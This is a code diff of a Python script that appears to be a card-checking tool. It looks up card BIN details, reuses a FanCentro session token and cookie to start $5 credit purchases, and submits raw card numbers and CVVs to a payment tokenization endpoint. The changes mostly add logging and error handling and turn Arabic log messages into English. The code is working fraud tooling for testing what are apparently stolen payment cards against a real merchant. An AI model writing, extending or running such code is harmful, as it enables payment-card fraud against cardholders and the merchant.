@@ -116,18 +116,22 @@ async def get_bin_info(bin_number):
             continue
         await asyncio.sleep(0.5)
     return "Unknown", "Unknown", "Unknown"
-    # ==================== FanCentro Functions ====================
+
+# ==================== FanCentro Functions ====================
 def fan_refresh_token():
     global FAN_TOKEN
     h = {'authorization': f'Bearer {FAN_TOKEN}', 'content-type': 'application/json', 'cookie': FAN_COOKIE, 'origin': 'https://fancentro.com', 'referer': 'https://fancentro.com/', 'user-agent': 'Mozilla/5.0'}
     p = {"withCredentials": True, "isRefreshToken": True}
     try:
         r = requests.post("https://fancentro.com/api/v1/api/refreshToken", json=p, headers=h, timeout=30)
+        print(f"[FAN] Refresh Status: {r.status_code}")
+        print(f"[FAN] Refresh Body: {r.text[:300]}")
         if r.status_code == 200:
             data = r.json()
             for key in ['token', 'jwt', 'access_token', 'refreshToken', 'accessToken']:
                 if key in data and data[key]:
                     FAN_TOKEN = data[key]
+                    print(f"[FAN] New Token: {FAN_TOKEN[:50]}...")
                     return True
             auth = r.headers.get('authorization', '')
             if auth:
@@ -137,31 +141,34 @@ def fan_refresh_token():
             if match:
                 FAN_TOKEN = match.group(0)
                 return True
-    except:
-        pass
+    except Exception as e:
+        print(f"[FAN] Refresh Error: {e}")
     return False
 
 def fan_headers():
     return {'authorization': f'Bearer {FAN_TOKEN}', 'content-type': 'application/json', 'cookie': FAN_COOKIE, 'origin': 'https://fancentro.com', 'referer': 'https://fancentro.com/chat', 'user-agent': 'Mozilla/5.0'}
+
 def fan_init():
     p = {"creditAmount":500,"displayAmount":"5","displayAmountFormatted":"5,00 $","priceAmountUsd":5,"taxDisclaimer":"","billingDisclaimer":"One time charge of 5,00 $. Will not rebill.","amount":5,"taxAmount":0,"totalAmount":5,"taxDisplayType":1,"taxApplicationId":"","taxRate":0,"taxName":"","productSku":FAN_SKU,"freeCreditsAmount":0,"freeCreditsPercent":0,"currency":"USD","currencySymbol":"$","creditAmountTotal":500,"paymentType":"cc","paymentMethod":"cc","displayName":"CREDIT CARD","type":"credit","baseAmount":5,"freeCreditAmount":0,"price":"5"}
     r = requests.post("https://fancentro.com/api/v2/api/purchase/credits/init", json=p, headers=fan_headers(), timeout=30)
-    print(f"Init Status: {r.status_code}")
+    print(f"[FAN] Init Status: {r.status_code}")
     if r.status_code == 401:
-        print("401 - بحاول اعمل refresh...")
+        print("[FAN] 401 - refresh...")
         fan_refresh_token()
         r = requests.post("https://fancentro.com/api/v2/api/purchase/credits/init", json=p, headers=fan_headers(), timeout=30)
-        print(f"Init بعد refresh: {r.status_code}")
+        print(f"[FAN] Init after refresh: {r.status_code}")
     if r.status_code != 200:
-        print(f"Init body: {r.text[:200]}")
+        print(f"[FAN] Init Error: {r.text[:300]}")
         return None
     data = r.json()
-    print(f"Init body: {json.dumps(data)[:200]}")
+    print(f"[FAN] Init Body: {json.dumps(data)[:300]}")
     mgpg = data.get('mgpgResponse')
     if not mgpg:
+        print("[FAN] No mgpgResponse!")
         return None
     pr = mgpg.get('nextAction', {}).get('extensions', {}).get('proxySettings', {}).get('settings', {})
     return {'sid': mgpg.get('sessionId'), 'cid': mgpg.get('correlationId'), 'jwt': mgpg.get('jwtToken'), 'vurl': data.get('validationUrl'), 'akey': pr.get('authenticationKey'), 'ts': pr.get('timestamp'), 'tid': pr.get('identifier', '4023327228985313')}
+
 def fan_tokenize(s, card, cvv):
     p = {"TokenExID":s['tid'],"Origin":"https://fancentro.com","AuthenticationKey":s['akey'],"Timestamp":s['ts'],"Data":card,"CvvValue":cvv,"TokenScheme":"PCI","CvvOnly":"False","PCI":"True","ReturnHash":None,"use3DS":"False","EnforceLuhnCompliance":"true","CustomDataLuhnCheck":True}
     h = {'content-type':'application/json','origin':'https://htp.tokenex.com','referer':'https://htp.tokenex.com/iframe/v3','user-agent':'Mozilla/5.0'}
